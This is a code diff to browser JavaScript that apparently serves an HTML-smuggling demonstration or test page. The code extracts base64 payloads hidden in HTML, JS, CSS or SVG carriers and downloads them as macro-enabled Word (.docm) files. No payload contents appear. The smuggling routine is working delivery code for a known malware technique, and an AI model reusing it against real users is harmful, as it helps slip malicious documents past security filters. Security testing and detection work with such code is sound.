@@ -244,54 +244,43 @@ document.querySelectorAll("[data-assembled-download]").forEach((button) => {
   });
 });
 
-const extractSmugglingPayload = (source, format) => {
-  if (format === "html") {
-    const payloadMatch = source.match(/data-smuggling-payload="([^"]+)"/);
-    return payloadMatch ? payloadMatch[1] : "";
-  }
+const extractSmugglingPayload = (format) => {
+  const carrier = document.querySelector(`[data-smuggling-carrier="${format}"]`);
 
-  if (format === "js") {
-    const payloadMatch = source.match(/<template[^>]*data-smuggling-payload="([^"]+)"[^>]*>/i);
-    return payloadMatch ? payloadMatch[1] : "";
+  if (!carrier) return "";
+
+  if (format === "html" || format === "js") {
+    return carrier.getAttribute("data-smuggling-payload") || "";
   }
 
   if (format === "css") {
-    const payloadMatch = source.match(/--smuggled-payload:\s*["']([A-Za-z0-9+/=\s]+)["']/);
+    const payloadMatch = carrier.textContent.match(/--smuggled-payload:\s*["']([A-Za-z0-9+/=\s]+)["']/);
     return payloadMatch ? payloadMatch[1] : "";
   }
 
   if (format === "svg") {
-    const payloadMatch = source.match(/<metadata[^>]*id="payload"[^>]*>([\s\S]*?)<\/metadata>/i);
-    return payloadMatch ? payloadMatch[1] : "";
+    const payload = carrier.querySelector("metadata");
+    return payload ? payload.textContent : "";
   }
 
   return "";
 };
 
-document.querySelectorAll("[data-smuggling-download]").forEach((link) => {
-  link.addEventListener("click", async (event) => {
-    const select = document.getElementById(link.getAttribute("data-source-select"));
+document.querySelectorAll("[data-smuggling-download]").forEach((button) => {
+  button.addEventListener("click", () => {
+    const select = document.getElementById(button.getAttribute("data-source-select"));
     const selectedOption = select ? select.options[select.selectedIndex] : null;
 
     if (!selectedOption) return;
 
-    event.preventDefault();
-
-    const format = selectedOption.getAttribute("data-smuggling-format") || "html";
+    const format = selectedOption.value || "html";
     const filename = selectedOption.getAttribute("data-smuggling-filename") || `${format}_smuggling.docm`;
 
     try {
-      const response = await fetch(selectedOption.value, { cache: "no-store" });
-
-      if (!response.ok) {
-        throw new Error(`${format.toUpperCase()} smuggling carrier request failed.`);
-      }
-
-      const source = await response.text();
-      const payload = extractSmugglingPayload(source, format).replace(/\s+/g, "");
+      const payload = extractSmugglingPayload(format).replace(/\s+/g, "");
 
       if (!payload) {
-        throw new Error(`${format.toUpperCase()} smuggling payload was not found.`);
+        throw new Error(`${format.toUpperCase()} smuggling payload was not found on the page.`);
       }
 
       downloadBytes(base64ToBytes(payload), filename, "application/vnd.ms-word.document.macroEnabled.12");
